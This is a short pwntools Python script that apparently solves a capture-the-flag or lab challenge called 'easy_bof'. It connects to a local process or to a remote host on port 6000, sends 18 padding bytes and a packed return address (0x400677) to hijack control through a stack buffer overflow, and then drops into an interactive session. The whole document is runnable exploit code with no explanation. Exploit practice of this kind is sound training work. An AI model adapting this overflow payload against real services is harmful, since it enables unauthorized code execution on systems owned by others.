from pwn import *

local = False
elf = 'easy_bof' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "sqlab.zongyuan.nctu.me"
	port = 6000
	r = remote(ip,port)

payload = p64(0x400677) 

r.recvuntil(':')
r.sendline(('\x00'*18)+payload)
r.interactive()
